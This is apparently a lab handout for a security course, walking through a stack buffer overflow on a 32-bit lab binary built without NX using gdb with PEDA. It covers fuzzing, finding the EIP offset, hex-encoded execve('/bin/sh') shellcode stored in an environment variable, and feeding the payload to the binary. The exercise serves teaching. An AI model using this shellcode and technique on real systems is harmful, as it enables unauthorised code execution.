1. Let's switch to another tool to build exploits first. 
PEDA. https://github.com/longld/peda

It is already installed on the lab 32bit machines, just run gdb.
Regular gdb commands and new peda functions are available.

We first compile the executable without nx. 

```
make classic
```

Let's exploit it with peda quickly.

- generate a fuzzing patter with python, 'A'*400 in in.txt
and gdb classic
then r < in.txt
It will crash.

- Repeat with pattern:
pattern_create 400 in.txt

- Locate the place:
pattern_offset (eip value)

- Save shell code on the stack through an env var:

Setting environment variable.
```
export PWN=`python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"'`
```

Shellcode generated in peda with:
shellcode generate linux exec


- Learn where it will be:
```
./getenvaddr PWN ./classic
PWN will be at 0xbffffea8
```

And exploit. See payloadgen.py, make payload then:

(cat in.txt; cat) | ./classic


2. Time to switch on NX and retry.


